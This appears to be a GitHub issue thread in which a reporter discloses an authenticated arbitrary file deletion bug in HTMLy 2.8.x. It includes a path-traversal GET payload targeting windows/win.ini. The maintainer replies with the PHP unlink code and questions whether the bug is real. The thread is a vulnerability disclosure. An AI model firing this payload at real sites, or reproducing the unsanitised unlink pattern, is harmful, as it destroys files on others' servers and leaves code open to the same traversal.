| Hi there, I found an arbitrary file deletion vulnerability in Htmly. **Proof of Concept:** tested on Windows7 and Htmly version 2.8.1 and 2.8.0 1. Log in to the dashboard，click **Tools** -->**Backup**-->**create backup** to create backup. 2. Arbitrary file deletion: click **Delete** and modify the file parameter. payload: GET /htmly1/admin/backup?file=htmly\_2021-05-12-09-33-30.zip/../../../../../../windows/win.ini&submit=Delete  [1](https://user-images.githubusercontent.com/34636478/117944977-6e048180-b340-11eb-89b9-6be4df23af47.png) [2](https://user-images.githubusercontent.com/34636478/117945032-7e1c6100-b340-11eb-9fee-7afd71034e8d.png) [3](https://user-images.githubusercontent.com/34636478/117945046-84124200-b340-11eb-8918-01a98b0bec83.PNG) [4](https://user-images.githubusercontent.com/34636478/117945624-16b2e100-b341-11eb-94a6-b4f8041dbb2e.png) [5](https://user-images.githubusercontent.com/34636478/117945639-19add180-b341-11eb-9a1b-fcea086d277e.png) |

| Hello,  Are you sure it can delete file outside the backup folder?  I already specify:  ``` if (login()) {     if (isset($_GET['file'])) {         $file = _h($_GET['file']);          if (!empty($file)) {             unlink("backup/$file");         }      } }  ```  So it always check if the user login or not and than always search the file inside backup folder in htmly installations folder. |
